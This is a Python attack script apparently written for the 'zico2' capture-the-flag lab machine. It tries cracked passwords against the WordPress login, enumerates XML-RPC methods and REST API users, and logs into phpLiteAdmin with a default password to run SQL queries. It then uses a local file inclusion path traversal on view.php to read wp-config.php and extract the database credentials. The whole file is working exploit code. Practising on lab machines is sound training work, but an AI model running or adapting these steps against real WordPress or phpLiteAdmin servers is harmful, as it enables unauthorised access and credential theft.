#!/usr/bin/env python3
"""zico2 - Try MySQL and WordPress with cracked credentials"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'

# 1. Try WordPress login
print('=== WordPress Login ===')
wp_url = f'{BASE}/wordpress/wp-login.php'
for user, pwd in [('root', '34kroot34'), ('zico', 'zico2215@'), ('admin', 'admin')]:
    r = s.post(wp_url, data={
        'log': user,
        'pwd': pwd,
        'wp-submit': 'Log In',
        'redirect_to': f'{BASE}/wordpress/wp-admin/',
    }, timeout=15, allow_redirects=False)
    location = r.headers.get('Location', '')
    print(f'  {user}:{pwd} -> {r.status_code} Location={location[:80]}')
    if 'wp-admin' in location and 'login' not in location:
        print(f'  [+] WordPress LOGIN SUCCESS!')
        break
    s.cookies.clear()

# 2. Try WordPress REST API / XML-RPC
print('\n=== WordPress XML-RPC ===')
r = s.post(f'{BASE}/wordpress/xmlrpc.php', 
    data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
    headers={'Content-Type': 'text/xml'},
    timeout=15)
if 'wp' in r.text.lower() or 'method' in r.text.lower():
    print(f'  XML-RPC available: {len(r.text)} bytes')
    methods = re.findall(r'<name>(wp\.[^<]+)</name>', r.text)
    print(f'  WP Methods: {methods[:10]}')
else:
    print(f'  XML-RPC: {r.status_code} ({len(r.text)}B)')

# 3. Check for WordPress users via REST API
print('\n=== WordPress REST API ===')
r = s.get(f'{BASE}/wordpress/wp-json/wp/v2/users', timeout=15)
if r.status_code == 200:
    print(f'  Users endpoint open!')
    users = re.findall(r'"slug":"([^"]+)"', r.text)
    print(f'  Users: {users}')

# 4. Try phpLiteAdmin SQL to find more info
print('\n=== phpLiteAdmin SQL - check tables ===')
PHPLITE = f'{BASE}/dbadmin/test_db.php'
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

queries = [
    'SELECT sqlite_master WHERE type="table";',
    'SELECT name FROM sqlite_master WHERE type="table";',
    'SELECT * FROM info;',
    'SELECT * FROM sqlite_master;',
]
for q in queries:
    r = s.post(f'{PHPLITE}?switchdb=%2Fusr%2Fdatabases%2Ftest_users&view=sql', data={
        'queryval': q,
        'delimiter': ';',
        'query': 'Go',
    }, timeout=15)
    if 'error' not in r.text.lower()[:500]:
        rows = re.findall(r'<td[^>]*>(.*?)</td>', r.text, re.DOTALL)
        clean = [re.sub(r'<[^>]+>', '', x).strip() for x in rows if re.sub(r'<[^>]+>', '', x).strip()]
        if clean:
            print(f'  Query OK ({len(clean)} cells): {clean[:15]}')
            break

# 5. Check if WordPress database is accessible
print('\n=== WordPress Config via LFI ===')
r = s.get(f'{BASE}/view.php?page=../../../var/www/html/wordpress/wp-config.php', timeout=10)
if 'Hacking' not in r.text and len(r.text) > 50:
    # Extract DB credentials
    db_name = re.search(r"DB_NAME.*?['\"]([^'\"]+)", r.text)
    db_user = re.search(r"DB_USER.*?['\"]([^'\"]+)", r.text)
    db_pass = re.search(r"DB_PASSWORD.*?['\"]([^'\"]+)", r.text)
    db_host = re.search(r"DB_HOST.*?['\"]([^'\"]+)", r.text)
    if db_user:
        print(f'  DB_NAME: {db_name.group(1) if db_name else "?"}')
        print(f'  DB_USER: {db_user.group(1)}')
        print(f'  DB_PASS: {db_pass.group(1) if db_pass else "?"}')
        print(f'  DB_HOST: {db_host.group(1) if db_host else "?"}')
else:
    print(f'  LFI blocked or empty: {len(r.text)}B')
